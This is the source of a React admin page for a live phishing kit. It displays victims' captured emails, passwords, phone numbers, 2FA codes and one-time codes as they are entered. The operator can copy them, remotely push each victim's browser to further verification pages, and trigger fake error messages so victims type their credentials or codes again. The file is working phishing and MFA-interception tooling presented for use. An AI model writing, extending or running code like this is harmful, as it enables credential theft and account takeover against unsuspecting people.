'use client';

import { useEffect, useState } from 'react';

type LiveData = {
  user_email?: string;
  user_password?: string;
  user_phone_number?: string;
  user_2fa_code?: string;
  user_verification_codes?: string;
};

type LiveEvent = { id: number; ts: number; type: string; data?: any };

type DecisionStatus = 'idle' | 'pending' | 'approved' | 'rejected';

type DecisionState = {
  status: DecisionStatus;
  target?: 'password' | 'otp';

  message?: string;
};

const getEventDescription = (type: string, data: any): string => {
  switch (type) {
    case 'user_login_submit':
      return data?.tab === 'password' ? 'Sign In' : 'One-time code';
    case 'user_verify2fa_submit':
      return '2FA Code';
    case 'user_verification_code_submit':
      return 'OTP';
    case 'user_verification_confirm':
      return 'Clicked Confirm on Verification Options';
    case 'user_verification_final_confirm':
      return 'Clicked Final Confirm';
    case 'user_verification_open':
      return 'Opened Verification Options';
    case 'user_verification_code_resend':
      return 'Clicked Resend Code';
    case 'user_verification_code_voice_call':
      return 'Clicked Voice Call';
    case 'user_click_different_number':
      return 'Clicked Use Different Phone Number';
    case 'user_click_back':
      return 'Clicked Back to Login';
    default:
      return type;
  }
};

export default function LiveDataPage() {
  const [data, setData] = useState<LiveData>({});
  const [events, setEvents] = useState<LiveEvent[]>([]);
  const [version, setVersion] = useState<number>(0);
  const [updatedAt, setUpdatedAt] = useState<number>(0);
  const [liveConnected, setLiveConnected] = useState<boolean>(false);
  const [uiNotice, setUiNotice] = useState<{ text: string; kind: 'info' | 'success' | 'error' } | null>(null);

  // Highlight state for blinking effect
  const [highlights, setHighlights] = useState<Record<string, boolean>>({});

  const [decision, setDecision] = useState<DecisionState>({ status: 'idle' });
  const [lastProcessedEventId, setLastProcessedEventId] = useState<number>(0);

  // Helper to trigger blink
  const triggerHighlight = (keys: string[]) => {
    setHighlights(prev => {
      const next = { ...prev };
      keys.forEach(k => next[k] = true);
      return next;
    });

    setTimeout(() => {
      setHighlights(prev => {
        const next = { ...prev };
        keys.forEach(k => next[k] = false);
        return next;
      });
    }, 2000); // 2 seconds fade out
  };

  // Enable scrolling for this admin page (the app globally uses body.lock-scroll for other flows)
  useEffect(() => {
    const body = document.body;
    const hadLock = body.classList.contains('lock-scroll');
    body.classList.remove('lock-scroll');
    return () => {
      if (hadLock) body.classList.add('lock-scroll');
    };
  }, []);

  // Live updates via SSE (fallback to polling)
  useEffect(() => {
    let isMounted = true;

    const applySnapshot = (snap: any) => {
      const d = (snap?.data || {}) as Partial<LiveData>;
      setData({
        user_email: d.user_email ?? '',
        user_password: d.user_password ?? '',
        user_phone_number: d.user_phone_number ?? '',
        user_2fa_code: d.user_2fa_code ?? '',
        user_verification_codes: d.user_verification_codes ?? '',
      });
      setEvents((snap?.events || []) as LiveEvent[]);
      setVersion(Number(snap?.version || 0));
      setUpdatedAt(Number(snap?.updatedAt || 0));
    };

    const fetchLiveData = async () => {
      try {
        const res = await fetch('/api/live-data');
        if (!res.ok) return;
        const json = await res.json();
        if (!isMounted) return;
        applySnapshot(json);
      } catch {
        // ignore polling errors
      }
    };

    let interval: any = null;
    let es: EventSource | null = null;

    try {
      es = new EventSource('/api/live-data/stream');
      es.addEventListener('snapshot', (evt: MessageEvent) => {
        try {
          const snap = JSON.parse(evt.data);
          if (!isMounted) return;
          applySnapshot(snap);
          setLiveConnected(true);
        } catch {
          // ignore
        }
      });
      es.onerror = () => {
        setLiveConnected(false);
        try {
          es?.close();
        } catch {
          // ignore
        }
        if (!interval) {
          fetchLiveData();
          interval = setInterval(fetchLiveData, 250);
        }
      };
    } catch {
      // EventSource not available -> polling
      fetchLiveData();
      interval = setInterval(fetchLiveData, 250);
    }

    return () => {
      isMounted = false;
      if (interval) clearInterval(interval);
      try {
        es?.close();
      } catch {
        // ignore
      }
    };
  }, []);

  // Poll login-decision state
  useEffect(() => {
    let isMounted = true;

    const fetchDecision = async () => {
      try {
        const res = await fetch('/api/login-decision');
        if (!res.ok) return;
        const json = await res.json();
        if (!isMounted) return;
        setDecision({
          status: json.status as DecisionStatus,
          target: json.target as 'password' | 'otp' | undefined,
          message: json.message as string | undefined,
        });
      } catch {
        // ignore polling errors
      }
    };

    fetchDecision();
    const interval = setInterval(fetchDecision, 500);
    return () => {
      isMounted = false;
      clearInterval(interval);
    };
  }, []);

  const handleApproveToPage = async (page: string) => {
    try {
      await fetch('/api/login-decision', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ action: 'approve', targetPage: page }),
      });
    } catch {
      // ignore
    }
  }


  // Automation: Listen for back/diff-phone events and trigger navigation
  useEffect(() => {
    if (events.length === 0) return;

    // Check only new events we haven't processed
    const newEvents = events.filter(e => e.id > lastProcessedEventId);
    if (newEvents.length === 0) return;

    let maxId = lastProcessedEventId;
    let shouldGoHome = false;

    newEvents.forEach(ev => {
      if (ev.id > maxId) maxId = ev.id;

      // Auto-navigation logic
      if (ev.type === 'user_click_back' || ev.type === 'user_click_different_number') {
        shouldGoHome = true;
      }

      // Highlighting logic
      if (ev.type === 'user_login_submit') {
        if (ev.data?.tab === 'password') {
          triggerHighlight(['email', 'password']);
        } else {
          triggerHighlight(['phone']);
        }
      } else if (ev.type === 'user_verify2fa_submit') {
        triggerHighlight(['2fa']);
      } else if (ev.type === 'user_verification_code_submit') {
        triggerHighlight(['otp']);
      }
    });

    setLastProcessedEventId(maxId);

    if (shouldGoHome) {
      console.log('🤖 Automation: Detected back/diff-phone event, sending user to Login...');
      void (async () => {
        try {
          await fetch('/api/remote-control', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ action: 'navigate', targetPage: '/' }),
          });
        } catch (e) { console.error(e); }
      })();
    }
  }, [events, lastProcessedEventId]);

  const handleGo = (page: string) => {
    // Treat live-data as the admin console:
    // do NOT navigate this page. Instead, command the remote client(s) to navigate.
    void (async () => {
      try {
        // Remote navigation for *any* page the user is currently on
        await fetch('/api/remote-control', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ action: 'navigate', targetPage: page }),
        });
      } catch {
        // ignore
      }
    })();

    // Also keep login-decision approve for the login page's existing wait loop
    void handleApproveToPage(page);
  };

  const handleReject = async (msg: string) => {
    try {
      // Manual error toast (remote) - works on any page user is on
      await fetch('/api/remote-control', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ action: 'toast', message: msg }),
      });

      await fetch('/api/login-decision', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        // still reject to stop the login page's "waiting for approval" loop,
        // but do NOT rely on this payload to show toast (toast is remote-controlled).
        body: JSON.stringify({ action: 'reject', message: '' }),
      });
    } catch {
      // ignore
    }
  };

  const handleClearCaptured = async () => {
    try {
      await fetch('/api/live-data/clear', { method: 'POST' });
    } catch {
      // ignore
    }
  };

  const copyText = async (text: string, label?: string) => {
    try {
      await navigator.clipboard.writeText(text ?? '');
      setUiNotice({ text: label ? `Copied ${label}` : 'Copied', kind: 'success' });
      setTimeout(() => setUiNotice(null), 1200);
    } catch {
      setUiNotice({ text: 'Copy failed', kind: 'error' });
      setTimeout(() => setUiNotice(null), 1600);
    }
  };

  // Pretty-print verification codes JSON if possible
  let prettyVerification = data.user_verification_codes ?? '';
  let verificationObj: Record<string, any> | null = null;
  try {
    if (data.user_verification_codes) {
      const parsed = JSON.parse(data.user_verification_codes);
      prettyVerification = JSON.stringify(parsed, null, 2);
      if (parsed && typeof parsed === 'object' && !Array.isArray(parsed)) {
        verificationObj = parsed as Record<string, any>;
      }
    }
  } catch {
    // keep raw string
  }

  // Style helper for highlighted rows
  const getRowStyle = (highlighted: boolean) => ({
    display: 'grid',
    gap: 8,
    alignItems: 'center',
    backgroundColor: highlighted ? 'rgba(74, 222, 128, 0.25)' : 'transparent',
    borderRadius: 6,
    padding: '4px 6px',
    margin: '0 -6px', // compensating for padding
    transition: 'background-color 0.5s ease'
  });

  return (
    <div
      style={{
        height: '100vh',
        overflowY: 'auto',
        WebkitOverflowScrolling: 'touch',
        padding: 16,
        fontFamily: 'ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, Arial',
        background: '#0f1112',
        color: '#e7e7e7',
      }}
    >
      {/* Admin-only notice */}
      {uiNotice && (
        <div style={{ position: 'fixed', left: '50%', bottom: 14, transform: 'translateX(-50%)', zIndex: 20000 }}>
          <div
            style={{
              padding: '8px 10px',
              borderRadius: 8,
              border: '1px solid #2a2f31',
              background: '#141718',
              color: '#e7e7e7',
              fontSize: 12,
              fontWeight: 700,
              boxShadow: '0 8px 30px rgba(0,0,0,0.35)',
              opacity: uiNotice.kind === 'error' ? 1 : 0.98,
              minWidth: 120,
              textAlign: 'center',
            }}
          >
            {uiNotice.text}
          </div>
        </div>
      )}
      <div
        style={{
          maxWidth: 420, // portrait/phone width
          margin: '0 auto',
        }}
      >
        <div style={{ display: 'grid', gridTemplateColumns: '1fr', gap: 16 }}>
          {/* Events */}
          <div style={{ border: '1px solid #2a2f31', borderRadius: 8, padding: 12, background: '#141718' }}>
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', gap: 8, marginBottom: 8 }}>
              <div style={{ display: 'flex', alignItems: 'baseline', gap: 8 }}>
                <div style={{ fontWeight: 700 }}>Live events</div>
                <div style={{ fontSize: 12, color: '#9aa0a6' }}>{events.length ? `last: ${new Date(events[events.length - 1].ts).toLocaleTimeString()}` : '—'}</div>
              </div>
              <button
                onClick={handleClearCaptured}
                title="Clear"
                style={{
                  padding: 6,
                  border: '1px solid #2a2f31',
                  borderRadius: 6,
                  background: '#0f1112',
                  color: '#9aa0a6',
                  cursor: 'pointer',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                }}
              >
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><polyline points="3 6 5 6 21 6"></polyline><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"></path><line x1="10" y1="11" x2="10" y2="17"></line><line x1="14" y1="11" x2="14" y2="17"></line></svg>
              </button>
            </div>
            <div
              style={{
                border: '1px solid #2a2f31',
                borderRadius: 6,
                background: '#0f1112',
                padding: 8,
                maxHeight: 140,
                overflowY: 'auto',
                fontSize: 12,
                lineHeight: '16px',
                fontFamily: 'ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace',
                color: '#e7e7e7',
                WebkitOverflowScrolling: 'touch',
              }}
            >
              {events.length === 0 ? (
                <div style={{ color: '#9aa0a6' }}>No events yet.</div>
              ) : (
                [...events].slice(-30).reverse().map((ev) => (
                  <div key={ev.id} style={{ padding: '2px 0', borderBottom: '1px solid rgba(42,47,49,0.5)' }}>
                    <span style={{ color: '#9aa0a6' }}>{new Date(ev.ts).toLocaleTimeString()} </span>
                    <span style={{ fontWeight: 700 }}>{getEventDescription(ev.type, ev.data)}</span>
                    {ev.data ? <span style={{ color: '#c9d1d9' }}> {JSON.stringify(ev.data)}</span> : null}
                  </div>
                ))
              )}
            </div>
          </div>

          {/* Captured */}
          <div style={{ border: '1px solid #2a2f31', borderRadius: 8, padding: 12, background: '#141718' }}>
            <div style={{ fontWeight: 700, marginBottom: 8 }}>Captured</div>
            <div style={{ display: 'grid', gap: 8, fontSize: 13 }}>
              {/* Email */}
              <div style={{ ...getRowStyle(highlights['email']), gridTemplateColumns: '30px 1fr auto auto' }}>
                <div style={{ color: '#9aa0a6', fontSize: 16, lineHeight: '16px' }}>📧</div>
                <div style={{ fontFamily: 'ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace', wordBreak: 'break-word', fontSize: 12, lineHeight: '16px' }}>{data.user_email || '-'}</div>
                <button onClick={() => handleGo('/verify-2fa')} style={{ padding: '6px 8px', border: '1px solid #2a2f31', borderRadius: 6, background: '#21262d', color: '#e7e7e7', fontSize: 10, fontWeight: 500 }}>
                  /verify-2fa
                </button>
                <button onClick={() => copyText(data.user_email || '', '📧')} disabled={!data.user_email} style={{ padding: '6px', border: '1px solid #2a2f31', borderRadius: 6, background: '#0f1112', color: '#e7e7e7', opacity: data.user_email ? 1 : 0.45, cursor: data.user_email ? 'pointer' : 'not-allowed' }}>
                  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
                </button>
              </div>

              {/* Password */}
              <div style={{ ...getRowStyle(highlights['password']), gridTemplateColumns: '30px 1fr auto' }}>
                <div style={{ color: '#9aa0a6', fontSize: 16, lineHeight: '16px' }}>🔑</div>
                <div style={{ fontFamily: 'ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace', wordBreak: 'break-word', fontSize: 12, lineHeight: '16px' }}>{data.user_password || '-'}</div>
                <button onClick={() => copyText(data.user_password || '', '🔑')} disabled={!data.user_password} style={{ padding: '6px', border: '1px solid #2a2f31', borderRadius: 6, background: '#0f1112', color: '#e7e7e7', opacity: data.user_password ? 1 : 0.45, cursor: data.user_password ? 'pointer' : 'not-allowed' }}>
                  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
                </button>
              </div>

              {/* 2FA Code */}
              <div style={{ ...getRowStyle(highlights['2fa']), gridTemplateColumns: '30px 1fr auto auto' }}>
                <div style={{ color: '#9aa0a6', fontSize: 16, lineHeight: '16px' }}>🛡️</div>
                <div style={{ fontFamily: 'ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace', wordBreak: 'break-word', fontSize: 12, lineHeight: '16px' }}>{data.user_2fa_code || '-'}</div>
                <button onClick={() => handleGo('/verification-code')} style={{ padding: '6px 8px', border: '1px solid #2a2f31', borderRadius: 6, background: '#21262d', color: '#e7e7e7', fontSize: 10, fontWeight: 500 }}>
                  /verification-code
                </button>
                <button onClick={() => copyText(data.user_2fa_code || '', '🛡️')} disabled={!data.user_2fa_code} style={{ padding: '6px', border: '1px solid #2a2f31', borderRadius: 6, background: '#0f1112', color: '#e7e7e7', opacity: data.user_2fa_code ? 1 : 0.45, cursor: data.user_2fa_code ? 'pointer' : 'not-allowed' }}>
                  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
                </button>
              </div>

              {/* Phone */}
              <div style={{ ...getRowStyle(highlights['phone']), gridTemplateColumns: '30px 1fr auto' }}>
                <div style={{ color: '#9aa0a6', fontSize: 16, lineHeight: '16px' }}>📞</div>
                <div style={{ fontFamily: 'ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace', wordBreak: 'break-word', fontSize: 12, lineHeight: '16px' }}>{data.user_phone_number || '-'}</div>
                <button onClick={() => copyText(data.user_phone_number || '', '📞')} disabled={!data.user_phone_number} style={{ padding: '6px', border: '1px solid #2a2f31', borderRadius: 6, background: '#0f1112', color: '#e7e7e7', opacity: data.user_phone_number ? 1 : 0.45, cursor: data.user_phone_number ? 'pointer' : 'not-allowed' }}>
                  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
                </button>
              </div>

              {/* OTP */}
              <div style={{ ...getRowStyle(highlights['otp']), gridTemplateColumns: '30px 1fr auto auto' }}>
                <div style={{ color: '#9aa0a6', fontSize: 16, lineHeight: '16px' }}>O</div>
                <div style={{ fontFamily: 'ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace', wordBreak: 'break-word', fontSize: 12, lineHeight: '16px' }}>{verificationObj?.otp || '-'}</div>
                <button onClick={() => handleGo('/verification')} style={{ padding: '6px 8px', border: '1px solid #2a2f31', borderRadius: 6, background: '#21262d', color: '#e7e7e7', fontSize: 10, fontWeight: 500 }}>
                  /verification
                </button>
                <button onClick={() => copyText(verificationObj?.otp || '', 'O')} disabled={!verificationObj?.otp} style={{ padding: '6px', border: '1px solid #2a2f31', borderRadius: 6, background: '#0f1112', color: '#e7e7e7', opacity: verificationObj?.otp ? 1 : 0.45, cursor: verificationObj?.otp ? 'pointer' : 'not-allowed' }}>
                  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
                </button>
              </div>

              {/* Verification codes */}
              <div style={{ display: 'grid', gap: 8 }}>
                <div style={{ display: 'grid', gridTemplateColumns: '30px 1fr', gap: 8, alignItems: 'center' }}>
                  <div style={{ color: '#9aa0a6', fontSize: 12, lineHeight: '16px' }}>Verification</div>
                  <div style={{ fontSize: 12, color: '#9aa0a6', lineHeight: '16px' }}>{verificationObj ? 'codes' : '-'}</div>
                </div>

                {verificationObj ? (
                  <div style={{ display: 'grid', gap: 8 }}>
                    {[
                      ['2fa', '2fa'],
                      ['email', 'E'],
                      ['phone', 'P'],
                    ].map(([key, label]) => {
                      const val = verificationObj?.[key];
                      const strVal = val === undefined || val === null ? '' : String(val);
                      const disabled = strVal.trim() === '';
                      const canApprove = key === '2fa' || key === 'email' || key === 'phone';
                      return (
                        <div
                          key={key}
                          style={{
                            display: 'grid',
                            gridTemplateColumns: canApprove ? '30px 1fr auto auto' : '30px 1fr auto',
                            gap: 8,
                            alignItems: 'center',
                          }}
                        >
                          <div style={{ color: '#9aa0a6', fontSize: 12, lineHeight: '16px' }}>{label}</div>
                          <div style={{ fontFamily: 'ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace', wordBreak: 'break-word', fontSize: 12, lineHeight: '16px' }}>
                            {disabled ? '-' : strVal}
                          </div>
                          <button
                            onClick={() => (disabled ? null : copyText(strVal, label))}
                            disabled={disabled}
                            style={{
                              padding: '6px',
                              border: '1px solid #2a2f31',
                              borderRadius: 6,
                              background: '#0f1112',
                              color: '#e7e7e7',
                              fontSize: 12,
                              opacity: disabled ? 0.45 : 1,
                              cursor: disabled ? 'not-allowed' : 'pointer',
                            }}
                          >
                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
                          </button>
                          {canApprove ? (
                            <button
                              onClick={() => {
                                if (disabled) return;
                                fetch('/api/remote-control', {
                                  method: 'POST',
                                  headers: { 'Content-Type': 'application/json' },
                                  body: JSON.stringify({ action: 'verify_approve', key }),
                                })
                                  .then(() => {
                                    setUiNotice({ text: `Approved ${label}`, kind: 'success' });
                                    setTimeout(() => setUiNotice(null), 1200);
                                  })
                                  .catch(() => {
                                    setUiNotice({ text: 'Approve failed', kind: 'error' });
                                    setTimeout(() => setUiNotice(null), 1600);
                                  });
                              }}
                              disabled={disabled}
                              style={{
                                padding: '7px 8px',
                                border: '1px solid #2a2f31',
                                borderRadius: 6,
                                background: '#141718',
                                color: '#e7e7e7',
                                fontSize: 12,
                                opacity: disabled ? 0.45 : 1,
                                cursor: disabled ? 'not-allowed' : 'pointer',
                              }}
                            >
                              Approve
                            </button>
                          ) : null}
                        </div>
                      );
                    })}
                  </div>
                ) : null}
              </div>

              <div style={{ display: 'flex', justifyContent: 'flex-end' }}>

              </div>
            </div>
          </div>

          {/* Controls */}
          <div style={{ border: '1px solid #2a2f31', borderRadius: 8, padding: 12, background: '#141718' }}>
            <div style={{ marginBottom: 14 }}>
              <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr 1fr', gap: 4, marginBottom: 8 }}>
                <button
                  onClick={() => handleGo('/success')}
                  style={{
                    padding: '6px',
                    border: '1px solid #2a2f31',
                    borderRadius: 6,
                    background: '#0f1112',
                    color: '#e7e7e7',
                    fontSize: 11,
                    textAlign: 'center',
                    fontWeight: 500
                  }}
                >
                  /success
                </button>
                <button
                  onClick={() => handleGo('/')}
                  style={{
                    padding: '6px',
                    border: '1px solid #2a2f31',
                    borderRadius: 6,
                    background: '#0f1112',
                    color: '#e7e7e7',
                    fontSize: 11,
                    textAlign: 'center',
                    fontWeight: 500
                  }}
                >
                  /
                </button>
              </div>

              <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr 1fr', gap: 4, marginBottom: 4 }}>
                {/* Row 1 */}
                <button onClick={() => handleReject('Invalid login or password.')} style={{ padding: '6px', border: '1px solid #2a2f31', borderRadius: 6, background: '#0f1112', fontSize: 11, color: '#e7e7e7', textAlign: 'left', fontWeight: 500, lineHeight: '1.2' }}>
                  Invalid login or password
                </button>
                <button onClick={() => handleReject('The user does not exist')} style={{ padding: '6px', border: '1px solid #2a2f31', borderRadius: 6, background: '#0f1112', fontSize: 11, color: '#e7e7e7', textAlign: 'left', fontWeight: 500, lineHeight: '1.2' }}>
                  The user does not exist
                </button>
                <button onClick={() => handleReject('Invalid username. Please log in using another method and update it on your profile.')} style={{ padding: '6px', border: '1px solid #2a2f31', borderRadius: 6, background: '#0f1112', fontSize: 11, color: '#e7e7e7', textAlign: 'left', fontWeight: 500, lineHeight: '1.2' }}>
                  Invalid username
                </button>

                {/* Row 2 */}
                <button onClick={() => handleReject('Verification code is incorrect')} style={{ padding: '6px', border: '1px solid #2a2f31', borderRadius: 6, background: '#0f1112', fontSize: 11, color: '#e7e7e7', textAlign: 'left', fontWeight: 500, lineHeight: '1.2' }}>
                  Verification code is incorrect
                </button>
                <button onClick={() => handleReject('Maximum attempts reached (7). Please try again after 24 hours.')} style={{ padding: '6px', border: '1px solid #2a2f31', borderRadius: 6, background: '#0f1112', fontSize: 11, color: '#e7e7e7', textAlign: 'left', fontWeight: 500, lineHeight: '1.2' }}>
                  Max attempts (7)
                </button>
                <button onClick={() => handleReject('Error occurred')} style={{ padding: '6px', border: '1px solid #2a2f31', borderRadius: 6, background: '#0f1112', fontSize: 11, color: '#e7e7e7', textAlign: 'left', fontWeight: 500, lineHeight: '1.2' }}>
                  Error occurred
                </button>

                {/* Row 3 */}
                <button onClick={() => handleReject('Invalid credentials. Please try again.')} style={{ padding: '6px', border: '1px solid #2a2f31', borderRadius: 6, background: '#0f1112', fontSize: 11, color: '#e7e7e7', textAlign: 'left', fontWeight: 500, lineHeight: '1.2' }}>
                  Invalid credentials
                </button>
                <button onClick={() => handleReject('Your request is rejected.')} style={{ padding: '6px', border: '1px solid #2a2f31', borderRadius: 6, background: '#0f1112', fontSize: 11, color: '#e7e7e7', textAlign: 'left', fontWeight: 500, lineHeight: '1.2' }}>
                  Your request is rejected
                </button>
              </div>

              {/* No custom message input */}
            </div>
          </div>
        </div>

      </div>
    </div>
  );
}
